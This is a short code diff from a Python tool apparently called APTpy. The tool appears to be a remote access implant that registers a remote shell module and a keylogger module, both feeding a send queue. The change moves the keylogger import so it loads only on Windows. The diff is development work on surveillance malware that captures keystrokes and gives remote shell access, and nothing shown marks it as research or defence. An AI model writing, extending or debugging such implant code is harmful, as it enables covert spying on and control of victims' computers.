@@ -120,12 +120,13 @@ class APTpy:
 
     def _registerModules(self):
         from lib.modules.shell import ShellModule
-        from lib.modules.keylogger import KeyloggerModule
 
         self.events['ShellModule'] = Event()
         self.modules.append(ShellModule(self.queue_send, self.events['ShellModule']))
 
         if self.platform == 'win32':
+            from lib.modules.keylogger import KeyloggerModule
+
             self.events['KeyloggerModule'] = Event()
             self.modules.append(KeyloggerModule(self.queue_send, self.events['KeyloggerModule']))
 try:
